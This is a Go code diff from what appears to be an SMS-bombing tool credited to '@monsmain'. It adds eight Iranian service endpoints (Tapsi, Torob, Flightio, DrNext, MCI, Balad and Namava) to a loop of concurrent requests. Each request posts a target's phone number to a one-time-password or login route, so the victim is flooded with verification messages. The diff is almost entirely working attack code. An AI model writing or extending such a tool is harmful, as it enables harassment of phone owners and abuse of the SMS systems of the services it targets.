@@ -346,17 +346,99 @@ cookieJar, _ := cookiejar.New(nil)
 	for i := 0; i < repeatCount; i++ {
 
 
-		// gateway.joordaroo.com request-otp (OTP - POST JSON)
+
+		// تپسی (Tapsi) - POST JSON
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
 				payload := map[string]interface{}{
-					"mobile": phone, // فرمت 09...
+					"credential": map[string]interface{}{
+						"phoneNumber": phone, // فرمت 09...
+						"role":        "PASSENGER",
+					},
 				}
-				sendJSONRequest(c, ctx, "https://gateway.joordaroo.com/lgc/v1/auth/request-otp", payload, &wg, ch)
+				sendJSONRequest(c, ctx, "https://tap33.me/api/v2/user", payload, &wg, ch)
 			}
 		}(client)
-                    }
+
+		// تورب (Torob) - GET
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				// ساخت URL با اضافه کردن شماره تلفن به پارامتر query
+				torobURL := fmt.Sprintf("https://api.torob.com/a/phone/send-pin/?phone_number=%s", getPhoneNumberNoZero(phone)) // فرمت 9...
+				sendGETRequest(c, ctx, torobURL, &wg, ch)
+			}
+		}(client)
+
+		// فلایتیو اپ (Flightio App) - POST JSON
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"userKey":     phone, // فرمت 09...
+					"userKeyType": 1,
+				}
+				sendJSONRequest(c, ctx, "https://app.flightio.com/bff/Authentication/CheckUserKey", payload, &wg, ch)
+			}
+		}(client)
+
+		// فلایتیو (Flightio) - POST JSON
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"userKey": phone, // فرمت 09...
+				}
+				sendJSONRequest(c, ctx, "https://flightio.com/bff/Authentication/CheckUserKey", payload, &wg, ch)
+			}
+		}(client)
+
+		// دکتر نکست (DrNext) - POST JSON
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"source": "besina",
+					"mobile": phone, // فرمت 09...
+				}
+				sendJSONRequest(c, ctx, "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", payload, &wg, ch)
+			}
+		}(client)
+
+		// ام سی آی شاپ (MCIShop) - POST JSON
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"msisdn": phone, // فرمت 09...
+				}
+				sendJSONRequest(c, ctx, "https://api-ebcom.mci.ir/services/auth/v1.0/otp", payload, &wg, ch)
+			}
+		}(client)
+
+		// اسنپ مارکت (SnapMarket) - POST JSON
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"phone_number": phone, // فرمت 09...
+					"os_type":      "W",
+				}
+				sendJSONRequest(c, ctx, "https://account.api.balad.ir/api/web/auth/login/", payload, &wg, ch)
+			}
+		}(client)
+
+		// نماوا (Namava) - POST Form (بر اساس حدس از کد PHP)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				// فرمت +989...
+				formData.Set("UserName", getPhoneNumberPlus98NoZero(phone))
+				sendFormRequest(c, ctx, "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", formData, &wg, ch)
+			}
+		}(client)
 		
 //Code by @monsmain
 	close(tasks)
